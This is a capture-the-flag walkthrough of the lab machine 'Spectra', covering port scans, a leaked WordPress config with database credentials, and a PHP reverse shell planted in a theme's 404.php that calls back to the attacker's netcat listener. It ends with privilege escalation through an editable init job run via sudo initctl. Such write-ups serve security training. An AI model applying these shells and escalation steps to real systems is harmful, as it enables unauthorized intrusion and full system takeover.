# Reconocimiento de puertos por TCP

To solve this machine we start with some enumeration ports (open services).

``` bash
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: nmapScan
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.91 scan initiated Sun Jul  4 14:06:50 2021 as: nmap -p- -sS --min-rate 5000 --open -vvvv -n -Pn -oN allPortss 10.10.10.229
   2   │ Nmap scan report for 10.10.10.229
   3   │ Host is up, received user-set (0.56s latency).
   4   │ Scanned at 2021-07-04 14:06:50 -05 for 175s
   5   │ Not shown: 52501 filtered ports, 13031 closed ports
   6   │ Reason: 52501 no-responses and 13031 resets
   7   │ Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
   8   │ PORT     STATE SERVICE REASON
   9   │ 22/tcp   open  ssh     syn-ack ttl 63
  10   │ 80/tcp   open  http    syn-ack ttl 63
  11   │ 3306/tcp open  mysql   syn-ack ttl 63
  12   │
  13   │ Read data files from: /usr/bin/../share/nmap
  14   │ # Nmap done at Sun Jul  4 14:09:45 2021 -- 1 IP address (1 host up) scanned in 175.22 seconds
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

There are some open ports `22,80,3306` we separate the nmap command in two. the first one to scan port recognition and it will work faster. then we can do the enumeration open services. So lets do it, Starting with port `22`and `80` we can see those are ssh and http and 80 is a webservers. And `3306` is a `mySQL services`.

``` bash
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: targeted
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.91 scan initiated Sun Jul  4 14:34:30 2021 as: nmap -sC -sV -p22,80,3306 -oN targeted 10.10.10.229
   2   │ Nmap scan report for 10.10.10.229
   3   │ Host is up (0.11s latency).
   4   │
   5   │ PORT     STATE SERVICE VERSION
   6   │ 22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
   7   │ | ssh-hostkey:
   8   │ |_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
   9   │ 80/tcp   open  http    nginx 1.17.4
  10   │ |_http-server-header: nginx/1.17.4
  11   │ |_http-title: Site doesn't have a title (text/html).
  12   │ 3306/tcp open  mysql   MySQL (unauthorized)
  13   │ |_ssl-cert: ERROR: Script execution failed (use -d to debug)
  14   │ |_ssl-date: ERROR: Script execution failed (use -d to debug)
  15   │ |_sslv2: ERROR: Script execution failed (use -d to debug)
  16   │ |_tls-alpn: ERROR: Script execution failed (use -d to debug)
  17   │ |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
  18   │
  19   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  20   │ # Nmap done at Sun Jul  4 14:35:10 2021 -- 1 IP address (1 host up) scanned in 40.30 seconds
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Before we keep going to the 80port web server. lets do more service enumerations. Lets do some `whatweb` enumeration, and some web directory enumeration.

``` bash 
whatweb 10.10.10.229
http://10.10.10.229 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.17.4], IP[10.10.10.229], nginx[1.17.4]
```

``` bash 
wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://10.10.10.229/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.229/FUZZ
Total requests: 951

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000501:   301        7 L      11 W       169 Ch      "main"
000000831:   301        7 L      11 W       169 Ch      "testing"

Total time: 0
Processed Requests: 951
Filtered Requests: 949
Requests/sec.: 0
```

We see some intersting directories `main and testing`.

So now we can go to web server and check what it has. we see some bare website with just two links. Those links just show us the directory `main` but show us a different directory `test` not `testing`.  But they give us an error, both of them.

![[Pasted image 20210704150154.png]]
![[Pasted image 20210704151143.png]]

Lets try to go just to the directory `main` and see if it will show us something different. Looks like it show us something, but has some truble. 

![[Pasted image 20210704151911.png]]

Thats cause its trying to resolve the domain name `spectra.htb`. So, lets add it to our hosts file  `/etc/hosts`.

``` bash
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: /etc/hosts
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Host addresses
   2   │ 127.0.0.1  localhost
   3   │ 127.0.1.1  oredreim
   4   │ 10.10.10.229 spectra.htb
```


Now, it show us something diffferent, it show us a wordpress. but there is something interesting, looks like it has a login. Lets go in and check default credentials. `administrator:administrator` or `admin:admin`.

But does not work, so we must keep looking.

![[Pasted image 20210704154148.png]]

Lets move us to the `/testing/` directory. And here we can see some files, and there is one interesting. There is a file named `wp-config.php.save`. We click on it and nothing happen, but we can check the page source, cause thats what we want to check. This is the configuration for the wordpress, that means maybe there we can obtain some credentials for the login.

![[Pasted image 20210704161636.png]]

So we start searching on it and we find some credentials, there is a user named `devtest` and a password `devteam01`.

``` php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'dev' );
/** MySQL database username */
define( 'DB_USER', 'devtest' );
/** MySQL database password */
define( 'DB_PASSWORD', 'devteam01' );
/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );
/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

Lets use those credentials into the wordpress login. But that not work. So lets keep trying now with some default user, like `admin` or `administrator`.

And looks like `administrator` works.

![[Pasted image 20210704164004.png]]

Poking around the page, we know that there are so many ways to get a reverse shell from a wordpress page, so lets do the best one (in my opinion).

Lets go to the theme editor.

![[Pasted image 20210704164601.png]]

And now change the theme file to the `404 template(404.php)`. here we are gonna create and `php reverse shell`, we can do the script by ourself or you can check for one on your machine using `locate`. 

Lets do the second option.

``` bash
locate php-reverse-shell
locate: warning: database ‘/var/cache/locate/locatedb’ is more than 8 days old (actual age is 40,0 days)
/usr/share/beef-xss/modules/exploits/m0n0wall/php-reverse-shell.php
/usr/share/laudanum/php/php-reverse-shell.php
/usr/share/laudanum/wordpress/templates/php-reverse-shell.php
/usr/share/webshells/php/php-reverse-shell.php
```

You can use the one you want but check the documentation of the scripts, change the things the say you must change, like `IP` and `PORT`.

``` bash 
  47   │ set_time_limit (0);
  48   │ $VERSION = "1.0";
  49   │ $ip = '127.0.0.1';  // CHANGE THIS
  50   │ $port = 1234;       // CHANGE THIS
  51   │ $chunk_size = 1400;
  52   │ $write_a = null;
  53   │ $error_a = null;
  54   │ $shell = 'uname -a; w; id; /bin/sh -i';
  55   │ $daemon = 0;
  56   │ $debug = 0;
```

Lets upload to the editor for `404.php`. after that we must go to the content where is the script we upload. if the editor give you an error you just need to change the theme to edit.

![[Pasted image 20210704174544.png]]
![[Pasted image 20210704174220.png]]

``` bash
http://spectra.htb/main/wp-content/themes/twentynineteen/404.php
```

After you upload the script you have to be listening in your local machine. And right after go to the directory where your script is.

``` bash 
sudo nc -nlvp 443
[sudo] password for oredreim:
listening on [any] 443 ...
connect to [10.10.16.29] from (UNKNOWN) [10.10.10.229] 41100
Linux spectra 5.4.66+ #1 SMP Tue Dec 22 13:39:49 UTC 2020 x86_64 AMD EPYC 7401P 24-Core Processor AuthenticAMD GNU/Linux
 15:48:45 up  6:56,  0 users,  load average: 0.18, 0.06, 0.01
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
uid=20155(nginx) gid=20156(nginx) groups=20156(nginx)
$
```

Now make a good shell cause that shell is not really practical `script /dev/null -c bash`.

``` bash 
$ script /dev/null -c bash

Script started, output log file is '/dev/null'.
nginx@spectra / $
``` 

`stty raw -echo; fg` then enter, write `reset` then xterm but lets specify again the term with `export TERM=xterm` and the shell to be a bash `export SHELL=bash`.

To finish lets specify the rows and the columns to our default ones. `stty rows 51 columns 235`.

# Lateral Movement.

So. lets keep scaling privileges, cause right now we are just xginx and can not read the user.txt flag. checking the home directory looks like there is an other user named katie, lets check what we can find or do to scale to katie.

Looking in the `OPT` directory, there is an interesting file named `autologin.conf.orig`.

![[Pasted image 20210704181218.png]]

If we read the script, it say that maybe we can find something in the directory `/etc/autologin`

![[Pasted image 20210704181256.png]]

Lets see whats in there, an we see a password.

![[Pasted image 20210704181633.png]]

Lets use it to get katie user with ssh.

![[Pasted image 20210704181833.png]]

Nice! we are now katie. and we must keep watching to get root.

# Privileges Scalation.

Using `sudo -l` katie can do a command as root.

![[Pasted image 20210704182307.png]]

So, what is initctl, initctl allows you to communicate and interact with the process init.

Then, we must locate `init`.

![[Pasted image 20210704183352.png]]

It is at the etc directory. So lets check with processes katie can execute. And some of them are `test`. 

![[Pasted image 20210704183859.png]]

Lets check what those test do. and we see that some of them are not important and we can edit them to our proposal.

But first lets see if those test are running or not, cause as we said before there are init process, it means that they start running when root tell them to do it. 

![[Pasted image 20210704184145.png]]

Looks like some of them are not running so we can edit one test file to start running and when it does give us a shell bash as root.

so lets edit the first one, test.conf.

![[Pasted image 20210704184601.png]]

We can delete everything on it except the `script` command that there will go the command we want to give us root.

![[Pasted image 20210704185359.png]]

Then we just need to run the command `sudo /sbin/initctl start test`, wait till it start running and then do `bash -p`. If some test does not work after start running you can just use an other one.

![[Pasted image 20210704185803.png]]






